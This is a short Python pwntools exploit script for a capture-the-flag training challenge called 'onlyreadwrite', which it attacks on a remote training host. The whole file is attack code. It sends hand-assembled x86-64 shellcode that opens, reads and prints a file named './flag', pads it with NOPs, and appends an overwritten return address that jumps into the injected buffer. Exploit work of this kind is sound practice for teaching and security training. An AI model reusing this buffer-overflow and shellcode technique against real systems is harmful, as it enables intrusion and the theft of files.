from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#r = process("./onlyreadwrite")
r = remote("training.jinblack.it", 2005)
#gdb.attach(r, """b main
#""")

shellcode = b"\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\x00\x42\x40\x00\x48\x31\xF6\x48\x31\xF2\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\x14\x42\x40\x00\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x14\x42\x40\x00\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05"
shellcode = shellcode.ljust(320, b"\x90")
shellcode = shellcode + b"./flag\x00"
shellcode = shellcode.ljust(1016, b"\x90")
payload = p64(0x004040c1)
r.send(shellcode + payload)

r.interactive()
